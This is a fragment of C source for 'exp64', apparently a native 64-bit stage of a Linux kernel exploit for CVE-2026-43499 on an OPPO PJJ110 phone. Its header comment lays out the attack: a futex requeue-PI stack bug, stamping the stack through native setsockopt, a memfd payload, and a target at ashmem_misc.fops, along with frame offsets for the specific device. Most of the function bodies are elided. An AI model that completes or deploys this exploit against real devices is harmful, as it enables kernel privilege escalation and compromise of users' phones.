/*
 * exp64 — CVE-2026-43499 native 64-bit ARM stage (PJJ110 / OPPO, 5.10.226).
 *
 * The 32-bit compat stamp path (exp32) is structurally dead on PJJ110:
 * __arm64_compat_sys_setsockopt / getsockopt are ENOSYS stubs (verified
 * from recovered kallsyms — paciasp; mov x0,#-0x26; ret).  The waiter,
 * stamper, owner and consumer all run as 64-bit threads in a single
 * process.  do_stamp_stack() calls native setsockopt (optlen=264)
 * directly, same as IonStack-S22U's S901WVLS4DWL3 (S22 5.10.168) target
 * which hit the identical compat-stub situation.
 *
 * The 64-bit futex path (__arm64_sys_futex -> do_futex ->
 * futex_wait_requeue_pi) allocates rt_mutex_waiter on the waiter's
 * kernel stack identically to the 32-bit path — the bug is in the
 * kernel futex logic, not the ABI.
 *
 * Payload buffer is passed via an inherited memfd (argv[1] = decimal
 * fd; buffer: 16 uint64_t words = 128 bytes).
 *
 * NOTE: STAMP_OFF in stack.c is a PJJ110-UNMEASURED placeholder.
 * PJJ110's futex_wait_requeue_pi frame is sub sp,#0x70 (S22U b0q was
 * #0x1a0) and do_ipv6_setsockopt is #0x30 — the S22U exp64 0x60 value
 * does NOT transfer.  Re-measure on-device (perf SP leak) before
 * trusting any stamp offset.
 */
#define _GNU_SOURCE
...
static void *consumer_thread(void *arg __attribute__((unused))) {
     ...
     *    into ashmem_misc.fops (see b0q rtmutex.c:663).
    ...
    if (getenv("exp64_RT")) {
         ...
         * sched_setattr runs rt_mutex_adjust_pi() on the target (b0q
...
int main(int argc, char **argv) {
    ...
    pr_info("CVE-2026-43499 exp64 (native 64-bit) stage pid=%d\n", getpid());
